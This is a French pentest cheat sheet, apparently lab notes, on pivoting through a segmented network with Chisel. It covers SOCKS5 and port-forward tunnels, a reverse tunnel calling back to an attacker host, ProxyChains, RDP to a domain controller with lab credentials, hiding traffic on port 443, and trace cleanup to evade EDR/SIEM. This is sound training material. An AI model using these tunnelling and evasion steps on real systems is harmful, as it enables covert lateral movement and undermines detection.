Ce flux illustre la mise en place d'un tunnel SOCKS5 via **Chisel** pour permettre le **Pivoting** au sein d'un réseau segmenté.

```mermaid
flowchart LR
    A[Attaquant] -- "Connexion (Client)" --> B[Pivot (Serveur)]
    B -- "Accès Réseau Interne" --> C[Cible (DC)]
    style A fill:#f9f,stroke:#333
    style B fill:#bbf,stroke:#333
    style C fill:#dfd,stroke:#333
```

## Installation & Compilation

### Cloner le projet Chisel

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

### Transférer le binaire Chisel sur la machine pivot

```bash
scp chisel ubuntu@10.129.202.64:~/
```

## Port Forwarding (Remote/Local) sans SOCKS

Pour des services spécifiques (ex: SMB, RDP, HTTP) où **ProxyChains** est instable, le port forwarding direct est préférable.

### Local Port Forwarding
Redirige un port de la machine locale vers un port distant via le pivot.
```bash
# Syntaxe: R:local_port:target_ip:target_port
./chisel client 10.129.202.64:1234 R:8080:172.16.5.19:80
```
Accès via `http://127.0.0.1:8080`.

### Remote Port Forwarding
Expose un service de l'attaquant vers la cible.
```bash
# Syntaxe: local_port:target_ip:target_port
./chisel client 10.129.202.64:1234 4444:127.0.0.1:4444
```

## Authentification (Chisel --auth)

Pour sécuriser le tunnel dans des environnements partagés ou hostiles, utilisez l'authentification par clé.

### Serveur avec authentification
```bash
./chisel server -p 1234 --auth "user:password"
```

### Client avec authentification
```bash
./chisel client --auth "user:password" 10.129.202.64:1234 socks
```

## Contournement des restrictions de pare-feu (HTTP/HTTPS)

Si le trafic est inspecté, utilisez le mode HTTPS ou le port 443 pour masquer le tunnel dans un flux web standard.

```bash
# Serveur
./chisel server -p 443 --key mysecretkey

# Client
./chisel client --key mysecretkey 10.129.202.64:443 socks
```

## Gestion des connexions persistantes

Pour maintenir l'accès malgré les instabilités réseau, utilisez les options de reconnexion automatique.

```bash
./chisel client --max-retry-interval 5s --keepalive 15s 10.129.202.64:1234 socks
```

## Mise en place d’un tunnel SOCKS5 avec Chisel

### Démarrer le serveur Chisel sur la machine pivot

```bash
./chisel server -v -p 1234 --socks5
```

> [!warning] 
> Attention au choix du port : assurez-vous que le port 1234 n'est pas déjà utilisé sur la cible.

Sortie attendue :

```text
server: Listening on http://0.0.0.0:1234
```

### Démarrer le client Chisel sur l'hôte d'attaque

```bash
./chisel client -v 10.129.202.64:1234 socks
```

Sortie attendue :

```text
client: Connected (Latency 120ms)
client: tun: SOCKS5 proxy listening on 127.0.0.1:1080
```

## Configuration de ProxyChains

### Modifier le fichier de configuration ProxyChains

```bash
nano /etc/proxychains.conf
```

Ajouter à la fin du fichier :

```text
socks5 127.0.0.1 1080
```

Vérification :

```bash
tail -f /etc/proxychains.conf
```

## Test du tunnel SOCKS5

### Connexion au DC avec RDP via Chisel

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

> [!note] 
> ProxyChains peut être lent avec des outils gourmands en connexions comme **Nmap** ; privilégiez le port forwarding direct pour le scan. Vérifiez toujours la connectivité via un ping ou un scan TCP simple avant de lancer des outils complexes.

## Chisel en mode Reverse

> [!info] 
> Le mode reverse est souvent nécessaire en cas de filtrage entrant strict sur la machine pivot.

### Démarrer Chisel en mode Reverse sur l'hôte d'attaque

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Sortie attendue :

```text
server: Reverse tunneling enabled
server: Listening on http://0.0.0.0:1234
```

### Connexion de l'hôte pivot à l'hôte d'attaque

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

### Modifier ProxyChains pour utiliser Chisel Reverse

Modifier `/etc/proxychains.conf` :

```text
socks5 127.0.0.1 1080
```

Tester la connexion au DC avec RDP via **Chisel** Reverse :

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Nettoyage des traces (Post-exploitation)

Le nettoyage est critique pour éviter la détection par les EDR/SIEM.

1. **Suppression du binaire** : 
   ```bash
   rm ~/chisel
   ```
2. **Arrêt des processus** :
   ```bash
   pkill chisel
   ```
3. **Nettoyage des logs** : Si des logs ont été générés sur la machine pivot (ex: `/var/log/auth.log` ou logs système), vérifiez leur intégrité.

## Concepts techniques

Le **Pivoting** via **Chisel** repose sur la création d'un tunnel **SOCKS5** encapsulé dans du HTTP. Ce mécanisme permet de rediriger le trafic réseau d'outils locaux vers des segments inaccessibles directement, facilitant le **Network Enumeration** et le **Lateral Movement**. L'utilisation de **ProxyChains** est complémentaire pour forcer les applications à transiter par ce tunnel. Pour des configurations plus avancées, le **SSH Tunneling** reste une alternative courante dans les phases de post-exploitation.